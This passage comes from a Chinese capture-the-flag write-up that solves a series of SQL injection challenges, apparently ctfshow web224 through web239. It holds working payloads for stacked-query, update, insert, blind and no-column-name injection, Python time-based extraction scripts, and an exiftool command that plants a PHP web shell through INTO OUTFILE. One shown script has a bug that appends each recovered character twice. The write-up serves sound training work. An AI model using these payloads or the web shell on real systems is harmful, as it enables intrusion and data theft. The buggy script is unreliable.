class="token string">),</span><span class="token interpolation"><span class="token punctuation">&#123;</span>generateNum<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">,</span><span class="token interpolation"><span class="token punctuation">&#123;</span>generateNum<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">))></span><span class="token interpolation"><span class="token punctuation">&#123;</span>generateNum<span class="token punctuation">(</span>mid<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">, username, 'a'))"</span></span>        <span class="token punctuation">&#125;</span>        response <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span> params<span class="token operator">=</span>params<span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token string">"userAUTO"</span> <span class="token keyword">in</span> response<span class="token punctuation">.</span>text<span class="token punctuation">:</span>            head <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            tail <span class="token operator">=</span> mid    <span class="token keyword">if</span> head <span class="token operator">!=</span> <span class="token number">32</span><span class="token punctuation">:</span>        flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>head<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] &#123;&#125; is right"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>head<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">break</span></code></pre><h4 id="web224-文件名注入"><a href="#web224-文件名注入" class="headerlink" title="web224(文件名注入)"></a>web224(文件名注入)</h4><p>查看&#x2F;robots.txt，发现&#x2F;pwdreset.php，进去后可以重置admin密码，然后是进行文件上传，但是上传什么文件都是类型错误</p><p>文件名注入，下载群里的<code>payload.bin</code>，十六进制的意思是</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token string backtick-quoted-string">`$_GET[1]?`</span><span class="token operator">></span></span></code></pre><p>然后进行Rce就行</p><p><img src="web224.png" loading="lazy"></p><p><strong>upload.php</strong></p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"error"</span><span class="token punctuation">]</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Return Code: "</span> <span class="token operator">.</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"error"</span><span class="token punctuation">]</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"&lt;br />"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"size"</span><span class="token punctuation">]</span><span class="token operator">></span><span class="token number">10</span><span class="token operator">*</span><span class="token number">1024</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"文件过大: "</span> <span class="token operator">.</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"size"</span><span class="token punctuation">]</span> <span class="token operator">/</span> <span class="token number">1024</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string double-quoted-string">" Kb&lt;br />"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"upload/"</span> <span class="token operator">.</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>      <span class="token punctuation">&#123;</span>      <span class="token keyword">echo</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"name"</span><span class="token punctuation">]</span> <span class="token operator">.</span> <span class="token string double-quoted-string">" already exists. "</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>    <span class="token keyword">else</span>      <span class="token punctuation">&#123;</span>  <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">10000</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">".zip"</span><span class="token punctuation">;</span>      <span class="token variable">$filetype</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">finfo</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">file</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/image|png|bmap|jpg|jpeg|application|text|audio|video/i"</span><span class="token punctuation">,</span><span class="token variable">$filetype</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"file type error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>  <span class="token variable">$filepath</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"upload/"</span><span class="token operator">.</span><span class="token variable">$filename</span><span class="token punctuation">;</span>  <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"INSERT INTO file(filename,filepath,filetype) VALUES ('"</span><span class="token operator">.</span><span class="token variable">$filename</span><span class="token operator">.</span><span class="token string double-quoted-string">"','"</span><span class="token operator">.</span><span class="token variable">$filepath</span><span class="token operator">.</span><span class="token string double-quoted-string">"','"</span><span class="token operator">.</span><span class="token variable">$filetype</span><span class="token operator">.</span><span class="token string double-quoted-string">"');"</span><span class="token punctuation">;</span>      <span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"tmp_name"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>      <span class="token string double-quoted-string">"upload/"</span> <span class="token operator">.</span> <span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token variable">$con</span> <span class="token operator">=</span> <span class="token function">mysqli_connect</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"localhost"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"root"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"root"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"ctf"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$con</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Could not connect: '</span> <span class="token operator">.</span> <span class="token function">mysqli_error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">mysqli_multi_query</span><span class="token punctuation">(</span><span class="token variable">$con</span><span class="token punctuation">,</span> <span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"location:filelist.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"Error: "</span> <span class="token operator">.</span> <span class="token variable">$sql</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"&lt;br>"</span> <span class="token operator">.</span> <span class="token function">mysqli_error</span><span class="token punctuation">(</span><span class="token variable">$con</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token function">mysqli_close</span><span class="token punctuation">(</span><span class="token variable">$con</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>    <span class="token delimiter important">?></span></span></code></pre><p>查询语句：</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">$sql &#x3D; &quot;INSERT INTO file(filename,filepath,filetype) VALUES (&#39;&quot;.$filename.&quot;&#39;,&#39;&quot;.$filepath.&quot;&#39;,&#39;&quot;.$filetype.&quot;&#39;);&quot;;</code></pre><p><img src="https://img-blog.csdnimg.cn/2020050915132686.png" alt="在这里插入图片描述" loading="lazy"><br>一般写成16进制形式，避免语句本身的单引号双引号对拼接造成干扰</p><p><img src="https://img-blog.csdnimg.cn/20200509151345661.png" alt="在这里插入图片描述" loading="lazy"><br>本地测试发现，写进去的16进制会自动被计算机识别出ASCII</p><p>用到exiftool工具把这个语句写到图片属性里面  语法：</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">exiftool -overwrite_original -comment&#x3D;&quot;y1ng\&quot;&#39;);select 0x3C3F3D60245F504F53545B305D603B into outfile &#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;1.php&#39;;--+&quot;</code></pre><h4 id="web225-堆叠plus-handler"><a href="#web225-堆叠plus-handler" class="headerlink" title="web225(堆叠plus handler)"></a>web225(堆叠plus handler)</h4><p>查询语句</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">//分页查询</span><span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"select id,username,pass from ctfshow_user where username = '<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$username</span><span class="token punctuation">&#125;</span></span>';"</span><span class="token punctuation">;</span>    </code></pre><p>返回逻辑</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">//师傅说过滤的越多越好</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/file|into|dump|union|select|update|delete|alter|drop|create|describe|set/i'</span><span class="token punctuation">,</span><span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$ret</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>    </code></pre><p><strong>handler</strong></p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">?username&#x3D;ctfshow&#39;;show tables;?username&#x3D;ctfshow&#39;;handler &#96;ctfshow_flagasa&#96; open;handler &#96;ctfshow_flagasa&#96; read first;</code></pre><p><strong>预处理</strong></p><p>利用concat绕过一切过滤，之后就是替换后面的database()为想要执行的语句即可，别忘了加空格</p><p>对于不知道啥是预处理：<a href="https://blog.csdn.net/solitudi/article/details/107823398?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522160652999219721940215459%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&request_id=160652999219721940215459&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_v2~rank_blog_default-1-107823398.pc_v2_rank_blog_default&utm_term=%E5%BC%BA%E7%BD%91%E6%9D%AF&spm=1018.2118.3001.4450">SQl注入强网杯 2019</a></p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">username&#x3D;user1&#39;;PREPARE y4tacker from concat(&#39;s&#39;,&#39;elect&#39;, &#39; database()&#39;);EXECUTE y4tacker;</code></pre><p>当然<code>concat(char(115,101,108,101,99,116)</code>也可以代替<code>select</code></p><p><strong>show</strong> 展示一下表名列名</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">&#39;;show tables;#&#39;;show columns from &#96;ctfshow_flagasa&#96;;#</code></pre><h4 id="web226"><a href="#web226" class="headerlink" title="web226"></a>web226</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">//师傅说过滤的越多越好</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/file|into|dump|union|select|update|delete|alter|drop|create|describe|set|show|\(/i'</span><span class="token punctuation">,</span><span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>   <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$ret</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span>   </code></pre><p>ban了<code>show</code>和<code>(</code>，可以使用16进制绕过</p><p><img src="web226.png" loading="lazy"></p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">?username&#x3D;user1&#39;;PREPARE hsad from 0x73656c6563742067726f75705f636f6e636174287461626c655f6e616d65292066726f6d20696e666f726d6174696f6e5f736368656d612e7461626c6573207768657265207461626c655f736368656d613d64617461626173652829;EXECUTE hsad;</code></pre><pre class="language-mysql" data-language="mysql"><code class="language-mysql">select flagasb from ctfsh_ow_flagas?username&#x3D;user1&#39;;PREPARE hsad from 0x73656c65637420666c61676173622066726f6d2063746673685f6f775f666c61676173;EXECUTE hsad;</code></pre><h4 id="web227-information-schema-Routines"><a href="#web227-information-schema-Routines" class="headerlink" title="web227(information_schema.Routines)"></a>web227(information_schema.Routines)</h4><p>这道题，你就算找遍所有地方基本上都找不到flag表<br>先给出其中一个<code>payload1&#39;;call getFlag();</code>虽然能得到答案但是意义不大<br>这道题考点其实是查看MySQL的存储过程<br><a href="https://blog.csdn.net/qq_41573234/article/details/80411079">MySQL——查看存储过程和函数</a></p><p><strong>查看存储过程和函数的信息</strong><br>在  MySQL 中，存储过程和函数的信息存储在<code>information_schema</code>数据库下的<code>Routines</code>表中，可以通过查询该表的记录来查询存储</p><p>过程和函数的信息，其基本的语法形式如下:</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">SELECT * FROM information_schema.RoutinesWHERE ROUTINE_NAME&#x3D;&#39; sp_name&#39;;</code></pre><p>其中，ROUTINE_NAME  字段中存储的是存储过程和函数的名称;   sp_name  参数表示存储过程或函数的名称。</p><p>我们去查<code>information_schema.routines</code>表</p><p><img src="web227.png" loading="lazy"></p><p>可以看到getFlag函数，当然flag直接就有</p><h4 id="web228"><a href="#web228" class="headerlink" title="web228"></a>web228</h4><p>查询语句</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">//分页查询</span><span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"select id,username,pass from ctfshow_user where username = '<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$username</span><span class="token punctuation">&#125;</span></span>';"</span><span class="token punctuation">;</span><span class="token variable">$bansql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"select char from banlist;"</span><span class="token punctuation">;</span>    </code></pre><p>返回逻辑</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">//师傅说内容太多，就写入数据库保存</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">count</span><span class="token punctuation">(</span><span class="token variable">$banlist</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$banlist</span> <span class="token keyword">as</span> <span class="token variable">$char</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/"</span><span class="token operator">.</span><span class="token variable">$char</span><span class="token operator">.</span><span class="token string double-quoted-string">"/i"</span><span class="token punctuation">,</span> <span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>      <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$ret</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>    </code></pre><pre class="language-mysql" data-language="mysql"><code class="language-mysql">select flagasba from ctfsh_ow_flagasaa?username&#x3D;user1&#39;;PREPARE hsad from 0x73656c65637420666c6167617362612066726f6d2063746673685f6f775f666c616761736161;EXECUTE hsad;</code></pre><h4 id="web229"><a href="#web229" class="headerlink" title="web229"></a>web229</h4><pre class="language-mysql" data-language="mysql"><code class="language-mysql">select flagasba from flag?username&#x3D;user1&#39;;PREPARE hsad from 0x73656c65637420666c6167617362612066726f6d20666c6167;EXECUTE hsad;</code></pre><h4 id="web230"><a href="#web230" class="headerlink" title="web230"></a>web230</h4><pre class="language-mysql" data-language="mysql"><code class="language-mysql">select flagasbas from flagaabbx?username&#x3D;user1&#39;;PREPARE hsad from 0x73656c65637420666c616761736261732066726f6d20666c61676161626278;EXECUTE hsad;</code></pre><h4 id="web231-update注入"><a href="#web231-update注入" class="headerlink" title="web231(update注入)"></a>web231(update注入)</h4><p>查询语句</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">//分页查询</span><span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"update ctfshow_user set pass = '<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$password</span><span class="token punctuation">&#125;</span></span>' where username = '<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$username</span><span class="token punctuation">&#125;</span></span>';"</span><span class="token punctuation">;</span>    </code></pre><pre class="language-mysql" data-language="mysql"><code class="language-mysql">POST:查表名  banlist,ctfshow_user,flagapassword&#x3D;ctfshow&#39;,username&#x3D;(select group_concat(table_name) from information_schema.tables where table_name&#x3D;database())#&amp;username&#x3D;no查列名  id,flagas,infopassword&#x3D;ctfshow&#39;,username&#x3D;(select group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;flaga&#39;)#&amp;username&#x3D;nogetFlagpassword&#x3D;ctfshow&#39;,username&#x3D;(select flagas from flaga)#&amp;username&#x3D;no</code></pre><h4 id="web232"><a href="#web232" class="headerlink" title="web232"></a>web232</h4><p>和上一题相比多给 password 套了一层 md5 函数后面还有个<code>)</code>注意闭合，对后面的 username 无影响。</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">POST:查表名  banlist,ctfshow_user,flagaapassword&#x3D;ctfshow&#39;),username&#x3D;(select group_concat(table_name) from information_schema.tables where table_name&#x3D;database())#&amp;username&#x3D;no查列名  id,flagass,infopassword&#x3D;ctfshow&#39;),username&#x3D;(select group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;flaga&#39;)#&amp;username&#x3D;nogetFlagpassword&#x3D;ctfshow&#39;),username&#x3D;(select flagas from flaga)#&amp;username&#x3D;no</code></pre><h4 id="web233"><a href="#web233" class="headerlink" title="web233"></a>web233</h4><p>禁用了<code>&#39;</code>，但是可以用<code>\</code></p><p>假设我们password传入\，username传入,username&#x3D;database()#</p><p>那么最终构成的语句如下</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">update ctfshow_user set pass &#x3D; &#39;\&#39; where username &#x3D; &#39;,username&#x3D;database()#&#39;等价于update ctfshow_user set pass &#x3D; &#39;x&#39;,username&#x3D;database()#&#39;</code></pre><p>所以就可以绕过了。</p><p><strong>payload</strong></p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">#获取表名  banlist,ctfshow_user,flag233333password&#x3D;\&amp;username&#x3D;,username&#x3D;(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database())%23#获取列名  id,flagass233,infopassword&#x3D;\&amp;username&#x3D;,username&#x3D;(select group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;flag233333&#39;)%23#获取数据password&#x3D;\&amp;username&#x3D;,username&#x3D;(select group_concat(flagass233) from flag233333)%23</code></pre><p>也可以使用盲注</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">"https://c095983b-1faf-4d65-a053-ba620caed799.challenge.ctf.show/api/?page=1&amp;limit=10"</span>flag <span class="token operator">=</span> <span class="token string">""</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">while</span> <span class="token number">1</span><span class="token punctuation">:</span>    i <span class="token operator">=</span> i <span class="token operator">+</span> <span class="token number">1</span>    head <span class="token operator">=</span> <span class="token number">32</span>    tail <span class="token operator">=</span> <span class="token number">127</span>    <span class="token keyword">while</span> head <span class="token operator">&lt;</span> tail<span class="token punctuation">:</span>        mid <span class="token operator">=</span> <span class="token punctuation">(</span>head <span class="token operator">+</span> tail<span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">1</span>        <span class="token comment"># 查数据库</span>        <span class="token comment"># payload = "select group_concat(table_name) from information_schema.tables where table_schema=database()"</span>        <span class="token comment"># 查表名</span>        <span class="token comment"># payload = "select column_name from information_schema.columns where table_name='flag233333' limit 1,1"</span>        <span class="token comment"># 查数据</span>        payload <span class="token operator">=</span> <span class="token string">"select flagass233 from flag233333"</span>        data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>            <span class="token string">'username'</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f"1' or if(ascii(substr((</span><span class="token interpolation"><span class="token punctuation">&#123;</span>payload<span class="token punctuation">&#125;</span></span><span class="token string">),</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">,1))></span><span class="token interpolation"><span class="token punctuation">&#123;</span>mid<span class="token punctuation">&#125;</span></span><span class="token string">,sleep(0.05),1)#"</span></span><span class="token punctuation">,</span>            <span class="token string">'password'</span><span class="token punctuation">:</span> <span class="token string">'4'</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">0.9</span><span class="token punctuation">)</span>            tail <span class="token operator">=</span> mid        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>            head <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span>    <span class="token keyword">if</span> head <span class="token operator">!=</span> <span class="token number">32</span><span class="token punctuation">:</span>        flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>head<span class="token punctuation">)</span>        flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>head<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] &#123;&#125; is right"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>head<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">break</span></code></pre><h4 id="web234"><a href="#web234" class="headerlink" title="web234"></a>web234</h4><pre class="language-mysql" data-language="mysql"><code class="language-mysql">#获取表名  banlist,ctfshow_user,flag23apassword&#x3D;\&amp;username&#x3D;,username&#x3D;(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database())%23#获取列名  id,flagass23s3,infopassword&#x3D;\&amp;username&#x3D;,username&#x3D;(select group_concat(column_name) from information_schema.columns where table_name&#x3D;0x666c6167323361)%23#获取数据password&#x3D;\&amp;username&#x3D;,username&#x3D;(select group_concat(flagass23s3) from flag23a)%23</code></pre><h4 id="web235-mysql-innodb-table-stats-无列名注入"><a href="#web235-mysql-innodb-table-stats-无列名注入" class="headerlink" title="web235(mysql.innodb_table_stats  无列名注入)"></a>web235(mysql.innodb_table_stats  无列名注入)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">//过滤 or ' </span></code></pre><p>因为or被禁导致<code>information_schema.tables</code>也被禁了，我们可以用表<code>mysql.innodb_table_stats</code>和<code>mysql.innodb_index_stats</code></p><p>来代替。</p><p><a href="https://www.jb51.net/article/134678.htm">概述MySQL统计信息</a></p><blockquote><p>5.6.6开始，MySQL默认使用了持久化统计信息，即INNODB_STATS_PERSISTENT&#x3D;ON，持久化统计信息保存在表mysql.innodb_table_stats和mysql.innodb_index_stats。</p></blockquote><p><a href="https://zhuanlan.zhihu.com/p/98206699">Mysql无列名注入</a></p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">#获取表名  banlist,ctfshow_user,flag23a1password&#x3D;\&amp;username&#x3D;,username&#x3D;(select group_concat(table_name) from mysql.innodb_table_stats where database_name&#x3D;database())##查数据——组合  0x2d --&gt; -password&#x3D;\&amp;username&#x3D;,username&#x3D;(select concat(&#96;1&#96;,0x2d,&#96;2&#96;,&#96;3&#96;) from (select 1,2,3 union select * from flag23a1 limit 1,1)a);##查数据——重命名，当&#96;被过滤的时候password&#x3D;\&amp;username&#x3D;,username&#x3D;(select b from (select 1,2 as b,3 union select * from flag23a1 limit 1,1)a);#</code></pre><h4 id="web236"><a href="#web236" class="headerlink" title="web236"></a>web236</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">//过滤 or ' flag</span></code></pre><p>过滤的是返回的flag，所以用<code>to_base64</code>绕过</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">#获取表名  banlist,ctfshow_user,flagapassword&#x3D;\&amp;username&#x3D;,username&#x3D;(select group_concat(table_name) from mysql.innodb_table_stats where database_name&#x3D;database())##查数据——组合  0x2d --&gt; -password&#x3D;\&amp;username&#x3D;,username&#x3D;(select concat(&#96;1&#96;,0x2d,to_base64(&#96;2&#96;),&#96;3&#96;) from (select 1,2,3 union select * from flaga limit 1,1)a);##查数据——重命名，当&#96;被过滤的时候password&#x3D;\&amp;username&#x3D;,username&#x3D;(select to_base64(b) from (select 1,2 as b,3 union select * from flaga limit 1,1)a);#</code></pre><h4 id="web237-insert注入"><a href="#web237-insert注入" class="headerlink" title="web237(insert注入)"></a>web237(insert注入)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">//插入数据</span><span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"insert into ctfshow_user(username,pass) value('<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$username</span><span class="token punctuation">&#125;</span></span>','<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$password</span><span class="token punctuation">&#125;</span></span>');"</span><span class="token punctuation">;</span></code></pre><p>向value值内进行插入，和update注入的逻辑一样</p><p><code>insert into table_name(column1, column2) value(value1,value2)</code></p><p>向value1进行注入，就会变成</p><p><code>insert into table_name(column1, column2) value( value1,(你想要输出的值) )#value2)</code></p><p>所以要注意对最后一个括号的闭合</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql"># 查表名  banlist,ctfshow_user,flagusername&#x3D;z&#39;,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()))#&amp;password&#x3D;1# 查列名  id,flagass23s3,infousername&#x3D;zz&#39;,(select group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;flag&#39;))#&amp;password&#x3D;1# getFlagusername&#x3D;zzz&#39;,(select flagass23s3 from flag))#&amp;password&#x3D;1</code></pre><h4 id="web238"><a href="#web238" class="headerlink" title="web238"></a>web238</h4><p>过滤了空格可以用<code>()</code>绕过</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql"># 查表名  banlist,ctfshow_user,flagbusername&#x3D;z&#39;,(select(group_concat(table_name))from(information_schema.tables)where(table_schema&#x3D;database())))#&amp;password&#x3D;1# 查列名  id,flag,infousername&#x3D;zz&#39;,(select(group_concat(column_name))from(information_schema.columns)where(table_name&#x3D;&#39;flagb&#39;)))#&amp;password&#x3D;1# getFlagusername&#x3D;zzz&#39;,(select(flag)from(flagb)))#&amp;password&#x3D;1</code></pre><h4 id="web239"><a href="#web239" 